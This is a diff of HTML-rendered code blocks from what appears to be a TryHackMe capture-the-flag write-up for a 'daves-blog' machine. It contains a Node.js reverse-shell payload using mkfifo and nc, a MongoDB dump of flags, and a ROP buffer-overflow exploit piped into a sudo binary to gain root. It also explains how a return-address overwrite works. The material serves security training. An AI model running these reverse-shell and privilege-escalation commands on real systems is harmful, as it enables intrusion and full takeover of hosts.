+<span class="w">  </span><span class="nt">&quot;_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;5ec6e5cf1dc4d364bf864107&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;dave&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;password&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;THM{SuperSe...dminPass...}&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;__v&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;iat&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1767356057</span>
+<span class="p">}</span>
+</code></pre></div>
 
-<pre class="codehilite"><code>require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc tun0 9001 &gt;/tmp/f', ()=&gt;{})
+<div class="codehilite"><pre><span></span><code><span class="n">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="k">exec</span><span class="p">(</span><span class="s1">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc tun0 9001 &gt;/tmp/f&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">()</span><span class="o">=&gt;</span><span class="err">{}</span><span class="p">)</span>
 
- nc -lvnp 9001
-listening on [any] 9001 ...
-dave@daves-blog:~/blog$ 
-dave@daves-blog:~/blog$
-</code></pre>
+<span class="w"> </span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lvnp</span><span class="w"> </span><span class="mi">9001</span>
+<span class="n">listening</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="o">[</span><span class="n">any</span><span class="o">]</span><span class="w"> </span><span class="mi">9001</span><span class="w"> </span><span class="p">...</span>
+<span class="n">dave</span><span class="nv">@daves</span><span class="o">-</span><span class="nl">blog</span><span class="p">:</span><span class="o">~/</span><span class="n">blog</span><span class="err">$</span><span class="w"> </span>
+<span class="n">dave</span><span class="nv">@daves</span><span class="o">-</span><span class="nl">blog</span><span class="p">:</span><span class="o">~/</span><span class="n">blog</span><span class="err">$</span>
+</code></pre></div>
 
-<pre class="codehilite"><code>dave@daves-blog:~$ mongo
-MongoDB shell version v3.6.3
-connecting to: mongodb://127.0.0.1:27017
-MongoDB server version: 3.6.3
-Welcome to the MongoDB shell.
-For interactive help, type &quot;help&quot;.
-For more comprehensive documentation, see
-        http://docs.mongodb.org/
-Questions? Try the support group
-        http://groups.google.com/group/mongodb-user
-Server has startup warnings: 
-2026-01-02T11:51:15.174+0000 I STORAGE  [initandlisten] 
-2026-01-02T11:51:15.174+0000 I STORAGE  [initandlisten] ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine
-2026-01-02T11:51:15.174+0000 I STORAGE  [initandlisten] **          See http://dochub.mongodb.org/core/prodnotes-filesystem
-2026-01-02T11:51:18.001+0000 I CONTROL  [initandlisten] 
-2026-01-02T11:51:18.002+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
-2026-01-02T11:51:18.002+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
-2026-01-02T11:51:18.002+0000 I CONTROL  [initandlisten] 
-&gt; show databases;
-admin       0.000GB
-config      0.000GB
-daves-blog  0.000GB
-local       0.000GB
-&gt; use &lt;database&gt;;
-switched to db &lt;database&gt;
-&gt; show tables;
-&gt; use admin;
-switched to db admin
-&gt; show tables;
-system.version
-&gt; use daves-blog;
-switched to db daves-blog
-&gt; show tables;
-posts
-users
-whatcouldthisbes
-&gt; show whatcouldthisbes;
-2026-01-02T12:26:53.317+0000 E QUERY    [thread1] Error: don't know how to show [whatcouldthisbes] :
-shellHelper.show@src/mongo/shell/utils.js:953:11
-shellHelper@src/mongo/shell/utils.js:706:15
-@(shellhelp2):1:1
-&gt; db.whatcouldthisbes.find()
-{ &quot;_id&quot; : ObjectId(&quot;5ec6e5cf1dc4d364bf864108&quot;), &quot;whatCouldThisBe&quot; : &quot;THM{993e107fc66844........d5b}&quot;, &quot;__v&quot; : 0 }
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="n">dave</span><span class="nv">@daves</span><span class="o">-</span><span class="nl">blog</span><span class="p">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">mongo</span>
+<span class="n">MongoDB</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="n">version</span><span class="w"> </span><span class="n">v3</span><span class="mf">.6.3</span>
+<span class="n">connecting</span><span class="w"> </span><span class="k">to</span><span class="err">:</span><span class="w"> </span><span class="nl">mongodb</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0.0.1</span><span class="err">:</span><span class="mi">27017</span>
+<span class="n">MongoDB</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="nl">version</span><span class="p">:</span><span class="w"> </span><span class="mf">3.6.3</span>
+<span class="n">Welcome</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">MongoDB</span><span class="w"> </span><span class="n">shell</span><span class="p">.</span>
+<span class="k">For</span><span class="w"> </span><span class="n">interactive</span><span class="w"> </span><span class="n">help</span><span class="p">,</span><span class="w"> </span><span class="n">type</span><span class="w"> </span><span class="ss">&quot;help&quot;</span><span class="p">.</span>
+<span class="k">For</span><span class="w"> </span><span class="n">more</span><span class="w"> </span><span class="n">comprehensive</span><span class="w"> </span><span class="n">documentation</span><span class="p">,</span><span class="w"> </span><span class="n">see</span>
+<span class="w">        </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="n">docs</span><span class="p">.</span><span class="n">mongodb</span><span class="p">.</span><span class="n">org</span><span class="o">/</span>
+<span class="n">Questions</span><span class="vm">?</span><span class="w"> </span><span class="k">Try</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">support</span><span class="w"> </span><span class="k">group</span>
+<span class="w">        </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="n">groups</span><span class="p">.</span><span class="n">google</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="k">group</span><span class="o">/</span><span class="n">mongodb</span><span class="o">-</span><span class="k">user</span>
+<span class="n">Server</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="n">startup</span><span class="w"> </span><span class="nl">warnings</span><span class="p">:</span><span class="w"> </span>
+<span class="mi">2026</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">02</span><span class="nl">T11</span><span class="p">:</span><span class="mi">51</span><span class="err">:</span><span class="mf">15.174</span><span class="o">+</span><span class="mi">0000</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">STORAGE</span><span class="w">  </span><span class="o">[</span><span class="n">initandlisten</span><span class="o">]</span><span class="w"> </span>
+<span class="mi">2026</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">02</span><span class="nl">T11</span><span class="p">:</span><span class="mi">51</span><span class="err">:</span><span class="mf">15.174</span><span class="o">+</span><span class="mi">0000</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">STORAGE</span><span class="w">  </span><span class="o">[</span><span class="n">initandlisten</span><span class="o">]</span><span class="w"> </span><span class="o">**</span><span class="w"> </span><span class="nl">WARNING</span><span class="p">:</span><span class="w"> </span><span class="k">Using</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">XFS</span><span class="w"> </span><span class="n">filesystem</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">strongly</span><span class="w"> </span><span class="n">recommended</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">WiredTiger</span><span class="w"> </span><span class="n">storage</span><span class="w"> </span><span class="n">engine</span>
+<span class="mi">2026</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">02</span><span class="nl">T11</span><span class="p">:</span><span class="mi">51</span><span class="err">:</span><span class="mf">15.174</span><span class="o">+</span><span class="mi">0000</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">STORAGE</span><span class="w">  </span><span class="o">[</span><span class="n">initandlisten</span><span class="o">]</span><span class="w"> </span><span class="o">**</span><span class="w">          </span><span class="n">See</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="n">dochub</span><span class="p">.</span><span class="n">mongodb</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">core</span><span class="o">/</span><span class="n">prodnotes</span><span class="o">-</span><span class="n">filesystem</span>
+<span class="mi">2026</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">02</span><span class="nl">T11</span><span class="p">:</span><span class="mi">51</span><span class="err">:</span><span class="mf">18.001</span><span class="o">+</span><span class="mi">0000</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">CONTROL</span><span class="w">  </span><span class="o">[</span><span class="n">initandlisten</span><span class="o">]</span><span class="w"> </span>
+<span class="mi">2026</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">02</span><span class="nl">T11</span><span class="p">:</span><span class="mi">51</span><span class="err">:</span><span class="mf">18.002</span><span class="o">+</span><span class="mi">0000</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">CONTROL</span><span class="w">  </span><span class="o">[</span><span class="n">initandlisten</span><span class="o">]</span><span class="w"> </span><span class="o">**</span><span class="w"> </span><span class="nl">WARNING</span><span class="p">:</span><span class="w"> </span><span class="n">Access</span><span class="w"> </span><span class="n">control</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">enabled</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">database</span><span class="p">.</span>
+<span class="mi">2026</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">02</span><span class="nl">T11</span><span class="p">:</span><span class="mi">51</span><span class="err">:</span><span class="mf">18.002</span><span class="o">+</span><span class="mi">0000</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">CONTROL</span><span class="w">  </span><span class="o">[</span><span class="n">initandlisten</span><span class="o">]</span><span class="w"> </span><span class="o">**</span><span class="w">          </span><span class="k">Read</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="k">write</span><span class="w"> </span><span class="n">access</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">data</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">configuration</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">unrestricted</span><span class="p">.</span>
+<span class="mi">2026</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">02</span><span class="nl">T11</span><span class="p">:</span><span class="mi">51</span><span class="err">:</span><span class="mf">18.002</span><span class="o">+</span><span class="mi">0000</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">CONTROL</span><span class="w">  </span><span class="o">[</span><span class="n">initandlisten</span><span class="o">]</span><span class="w"> </span>
+<span class="o">&gt;</span><span class="w"> </span><span class="n">show</span><span class="w"> </span><span class="n">databases</span><span class="p">;</span>
+<span class="k">admin</span><span class="w">       </span><span class="mf">0.000</span><span class="n">GB</span>
+<span class="n">config</span><span class="w">      </span><span class="mf">0.000</span><span class="n">GB</span>
+<span class="n">daves</span><span class="o">-</span><span class="n">blog</span><span class="w">  </span><span class="mf">0.000</span><span class="n">GB</span>
+<span class="k">local</span><span class="w">       </span><span class="mf">0.000</span><span class="n">GB</span>
+<span class="o">&gt;</span><span class="w"> </span><span class="k">use</span><span class="w"> </span><span class="o">&lt;</span><span class="k">database</span><span class="o">&gt;</span><span class="p">;</span>
+<span class="n">switched</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">db</span><span class="w"> </span><span class="o">&lt;</span><span class="k">database</span><span class="o">&gt;</span>
+<span class="o">&gt;</span><span class="w"> </span><span class="n">show</span><span class="w"> </span><span class="n">tables</span><span class="p">;</span>
+<span class="o">&gt;</span><span class="w"> </span><span class="k">use</span><span class="w"> </span><span class="k">admin</span><span class="p">;</span>
+<span class="n">switched</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">db</span><span class="w"> </span><span class="k">admin</span>
+<span class="o">&gt;</span><span class="w"> </span><span class="n">show</span><span class="w"> </span><span class="n">tables</span><span class="p">;</span>
+<span class="k">system</span><span class="p">.</span><span class="n">version</span>
+<span class="o">&gt;</span><span class="w"> </span><span class="k">use</span><span class="w"> </span><span class="n">daves</span><span class="o">-</span><span class="n">blog</span><span class="p">;</span>
+<span class="n">switched</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">db</span><span class="w"> </span><span class="n">daves</span><span class="o">-</span><span class="n">blog</span>
+<span class="o">&gt;</span><span class="w"> </span><span class="n">show</span><span class="w"> </span><span class="n">tables</span><span class="p">;</span>
+<span class="n">posts</span>
+<span class="n">users</span>
+<span class="n">whatcouldthisbes</span>
+<span class="o">&gt;</span><span class="w"> </span><span class="n">show</span><span class="w"> </span><span class="n">whatcouldthisbes</span><span class="p">;</span>
+<span class="mi">2026</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">02</span><span class="nl">T12</span><span class="p">:</span><span class="mi">26</span><span class="err">:</span><span class="mf">53.317</span><span class="o">+</span><span class="mi">0000</span><span class="w"> </span><span class="n">E</span><span class="w"> </span><span class="n">QUERY</span><span class="w">    </span><span class="o">[</span><span class="n">thread1</span><span class="o">]</span><span class="w"> </span><span class="nl">Error</span><span class="p">:</span><span class="w"> </span><span class="n">don</span><span class="err">&#39;</span><span class="n">t</span><span class="w"> </span><span class="n">know</span><span class="w"> </span><span class="n">how</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">show</span><span class="w"> </span><span class="o">[</span><span class="n">whatcouldthisbes</span><span class="o">]</span><span class="w"> </span><span class="err">:</span>
+<span class="n">shellHelper</span><span class="p">.</span><span class="n">show</span><span class="nv">@src</span><span class="o">/</span><span class="n">mongo</span><span class="o">/</span><span class="n">shell</span><span class="o">/</span><span class="n">utils</span><span class="p">.</span><span class="nl">js</span><span class="p">:</span><span class="mi">953</span><span class="err">:</span><span class="mi">11</span>
+<span class="n">shellHelper</span><span class="nv">@src</span><span class="o">/</span><span class="n">mongo</span><span class="o">/</span><span class="n">shell</span><span class="o">/</span><span class="n">utils</span><span class="p">.</span><span class="nl">js</span><span class="p">:</span><span class="mi">706</span><span class="err">:</span><span class="mi">15</span>
+<span class="err">@</span><span class="p">(</span><span class="n">shellhelp2</span><span class="p">)</span><span class="err">:</span><span class="mi">1</span><span class="err">:</span><span class="mi">1</span>
+<span class="o">&gt;</span><span class="w"> </span><span class="n">db</span><span class="p">.</span><span class="n">whatcouldthisbes</span><span class="p">.</span><span class="n">find</span><span class="p">()</span>
+<span class="err">{</span><span class="w"> </span><span class="ss">&quot;_id&quot;</span><span class="w"> </span><span class="err">:</span><span class="w"> </span><span class="n">ObjectId</span><span class="p">(</span><span class="ss">&quot;5ec6e5cf1dc4d364bf864108&quot;</span><span class="p">),</span><span class="w"> </span><span class="ss">&quot;whatCouldThisBe&quot;</span><span class="w"> </span><span class="err">:</span><span class="w"> </span><span class="ss">&quot;THM{993e107fc66844........d5b}&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;__v&quot;</span><span class="w"> </span><span class="err">:</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="err">}</span>
+</code></pre></div>
 
-<pre class="codehilite"><code>dave@daves-blog:~$ sudo -l
-Matching Defaults entries for dave on daves-blog:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+<div class="codehilite"><pre><span></span><code><span class="n">dave</span><span class="nd">@daves</span><span class="o">-</span><span class="n">blog</span><span class="p">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="o">-</span><span class="n">l</span>
+<span class="n">Matching</span><span class="w"> </span><span class="n">Defaults</span><span class="w"> </span><span class="n">entries</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">dave</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">daves</span><span class="o">-</span><span class="n">blog</span><span class="p">:</span>
+<span class="w">    </span><span class="n">env_reset</span><span class="p">,</span><span class="w"> </span><span class="n">mail_badpass</span><span class="p">,</span>
+<span class="w">    </span><span class="n">secure_path</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span><span class="w">\</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="w">\</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="w">\</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="w">\</span><span class="p">:</span><span class="o">/</span><span class="n">sbin</span><span class="w">\</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="w">\</span><span class="p">:</span><span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="nb">bin</span>
 
-User dave may run the following commands on daves-blog:
-    (root) NOPASSWD: /uid_checker
-dave@daves-blog:~$ cd /tmp
-dave@daves-blog:/tmp$ ls
-f        systemd-private-06c6945ea3c0469d8a9cec85339c9c77-systemd-resolved.service-5ET2p0
-payload  systemd-private-06c6945ea3c0469d8a9cec85339c9c77-systemd-timesyncd.service-Nt1IIf
-dave@daves-blog:/tmp$ rm payload
-dave@daves-blog:/tmp$ python3 -c 'import sys; from struct import pack; \
-&gt; padding = b&quot;A&quot;*88; \
-&gt; pop_rdi = pack(&quot;&lt;Q&quot;, 0x400803); \
-&gt; bin_sh = pack(&quot;&lt;Q&quot;, 0x400840); \
-&gt; system_addr = pack(&quot;&lt;Q&quot;, 0x4006be); \
-&gt; sys.stdout.buffer.write(padding + pop_rdi + bin_sh + system_addr)' &gt; /tmp/rop_payload
-dave@daves-blog:/tmp$ ls
-f            systemd-private-06c6945ea3c0469d8a9cec85339c9c77-systemd-resolved.service-5ET2p0
-rop_payload  systemd-private-06c6945ea3c0469d8a9cec85339c9c77-systemd-timesyncd.service-Nt1IIf
-dave@daves-blog:/tmp$ (cat /tmp/rop_payload; echo &quot;whoami&quot;; cat) | sudo /uid_checker
-Welcome to the UID checker!
-Enter 1 to check your UID or enter 2 to check your GID
-Invalid choice
-2
-/bin/sh: 1: 2: not found
-1
-/bin/sh: 2: 1: not found
+<span class="n">User</span><span class="w"> </span><span class="n">dave</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">following</span><span class="w"> </span><span class="n">commands</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">daves</span><span class="o">-</span><span class="n">blog</span><span class="p">:</span>
+<span class="w">    </span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"> </span><span class="n">NOPASSWD</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">uid_checker</span>
+<span class="n">dave</span><span class="nd">@daves</span><span class="o">-</span><span class="n">blog</span><span class="p">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span>
+<span class="n">dave</span><span class="nd">@daves</span><span class="o">-</span><span class="n">blog</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span>
+<span class="n">f</span><span class="w">        </span><span class="n">systemd</span><span class="o">-</span><span class="n">private</span><span class="o">-</span><span class="mi">06</span><span class="n">c6945ea3c0469d8a9cec85339c9c77</span><span class="o">-</span><span class="n">systemd</span><span class="o">-</span><span class="n">resolved</span><span class="o">.</span><span class="n">service</span><span class="o">-</span><span class="mi">5</span><span class="n">ET2p0</span>
+<span class="n">payload</span><span class="w">  </span><span class="n">systemd</span><span class="o">-</span><span class="n">private</span><span class="o">-</span><span class="mi">06</span><span class="n">c6945ea3c0469d8a9cec85339c9c77</span><span class="o">-</span><span class="n">systemd</span><span class="o">-</span><span class="n">timesyncd</span><span class="o">.</span><span class="n">service</span><span class="o">-</span><span class="n">Nt1IIf</span>
+<span class="n">dave</span><span class="nd">@daves</span><span class="o">-</span><span class="n">blog</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span><span class="w"> </span><span class="n">rm</span><span class="w"> </span><span class="n">payload</span>
+<span class="n">dave</span><span class="nd">@daves</span><span class="o">-</span><span class="n">blog</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span><span class="w"> </span><span class="n">python3</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="s1">&#39;import sys; from struct import pack; </span><span class="se">\</span>
+<span class="s1">&gt; padding = b&quot;A&quot;*88; </span><span class="se">\</span>
+<span class="s1">&gt; pop_rdi = pack(&quot;&lt;Q&quot;, 0x400803); </span><span class="se">\</span>
+<span class="s1">&gt; bin_sh = pack(&quot;&lt;Q&quot;, 0x400840); </span><span class="se">\</span>
+<span class="s1">&gt; system_addr = pack(&quot;&lt;Q&quot;, 0x4006be); </span><span class="se">\</span>
+<span class="s1">&gt; sys.stdout.buffer.write(padding + pop_rdi + bin_sh + system_addr)&#39;</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">rop_payload</span>
+<span class="n">dave</span><span class="nd">@daves</span><span class="o">-</span><span class="n">blog</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span>
+<span class="n">f</span><span class="w">            </span><span class="n">systemd</span><span class="o">-</span><span class="n">private</span><span class="o">-</span><span class="mi">06</span><span class="n">c6945ea3c0469d8a9cec85339c9c77</span><span class="o">-</span><span class="n">systemd</span><span class="o">-</span><span class="n">resolved</span><span class="o">.</span><span class="n">service</span><span class="o">-</span><span class="mi">5</span><span class="n">ET2p0</span>
+<span class="n">rop_payload</span><span class="w">  </span><span class="n">systemd</span><span class="o">-</span><span class="n">private</span><span class="o">-</span><span class="mi">06</span><span class="n">c6945ea3c0469d8a9cec85339c9c77</span><span class="o">-</span><span class="n">systemd</span><span class="o">-</span><span class="n">timesyncd</span><span class="o">.</span><span class="n">service</span><span class="o">-</span><span class="n">Nt1IIf</span>
+<span class="n">dave</span><span class="nd">@daves</span><span class="o">-</span><span class="n">blog</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span><span class="w"> </span><span class="p">(</span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">rop_payload</span><span class="p">;</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s2">&quot;whoami&quot;</span><span class="p">;</span><span class="w"> </span><span class="n">cat</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="o">/</span><span class="n">uid_checker</span>
+<span class="n">Welcome</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">UID</span><span class="w"> </span><span class="n">checker</span><span class="err">!</span>
+<span class="n">Enter</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">check</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">UID</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">enter</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">check</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">GID</span>
+<span class="n">Invalid</span><span class="w"> </span><span class="n">choice</span>
+<span class="mi">2</span>
+<span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">:</span><span class="w"> </span><span class="mi">2</span><span class="p">:</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">found</span>
+<span class="mi">1</span>
+<span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span><span class="p">:</span><span class="w"> </span><span class="mi">2</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">:</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">found</span>
 
-id
-uid=0(root) gid=0(root) groups=0(root)
-cd root
-/bin/sh: 5: cd: can't cd to root
-cd ..
-cd root
-ls
-root.txt  setup.sh
-cat root.txt
-</code></pre>
+<span class="nb">id</span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"> </span><span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span>
+<span class="n">cd</span><span class="w"> </span><span class="n">root</span>
+<span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span><span class="p">:</span><span class="w"> </span><span class="n">cd</span><span class="p">:</span><span class="w"> </span><span class="n">can</span><span class="s1">&#39;t cd to root</span>
+<span class="n">cd</span><span class="w"> </span><span class="o">..</span>
+<span class="n">cd</span><span class="w"> </span><span class="n">root</span>
+<span class="n">ls</span>
+<span class="n">root</span><span class="o">.</span><span class="n">txt</span><span class="w">  </span><span class="n">setup</span><span class="o">.</span><span class="n">sh</span>
+<span class="n">cat</span><span class="w"> </span><span class="n">root</span><span class="o">.</span><span class="n">txt</span>
+</code></pre></div>
 
-<pre class="codehilite"><code>Overwriting the Return Address
+<div class="codehilite"><pre><span></span><code><span class="n">Overwriting</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">Return</span><span class="w"> </span><span class="n">Address</span>
 
-In a normal program, when a function finishes, it looks at a specific spot on the stack (the Return Address) to know where to go back to.
+<span class="n">In</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">normal</span><span class="w"> </span><span class="n">program</span><span class="p">,</span><span class="w"> </span><span class="n">when</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">finishes</span><span class="p">,</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">looks</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">specific</span><span class="w"> </span><span class="n">spot</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">stack</span><span class="w"> </span><span class="p">(</span><span class="n">the</span><span class="w"> </span><span class="n">Return</span><span class="w"> </span><span class="n">Address</span><span class="p">)</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">know</span><span class="w"> </span><span class="n">where</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">go</span><span class="w"> </span><span class="n">back</span><span class="w"> </span><span class="n">to</span><span class="o">.</span>
 
-By sending 88 bytes, we reach that exact spot. The next 8 bytes we send overwrite that address. Instead of the program going back to its normal routine, we hijack the CPU and tell it to jump to a Gadget.
-2. The Power of the &quot;Gadget&quot; (pop rdi; ret)
+<span class="n">By</span><span class="w"> </span><span class="n">sending</span><span class="w"> </span><span class="mi">88</span><span class="w"> </span><span class="n">bytes</span><span class="p">,</span><span class="w"> </span><span class="n">we</span><span class="w"> </span><span class="n">reach</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">exact</span><span class="w"> </span><span class="n">spot</span><span class="o">.</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">next</span><span class="w"> </span><span class="mi">8</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="n">we</span><span class="w"> </span><span class="n">send</span><span class="w"> </span><span class="n">overwrite</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">address</span><span class="o">.</span><span class="w"> </span><span class="n">Instead</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">program</span><span class="w"> </span><span class="n">going</span><span class="w"> </span><span class="n">back</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">its</span><span class="w"> </span><span class="n">normal</span><span class="w"> </span><span class="n">routine</span><span class="p">,</span><span class="w"> </span><span class="n">we</span><span class="w"> </span><span class="n">hijack</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">CPU</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">tell</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">jump</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">Gadget</span><span class="o">.</span>
+<span class="mf">2.</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">Power</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="s2">&quot;Gadget&quot;</span><span class="w"> </span><span class="p">(</span><span class="n">pop</span><span class="w"> </span><span class="n">rdi</span><span class="p">;</span><span class="w"> </span><span class="n">ret</span><span class="p">)</span>
 
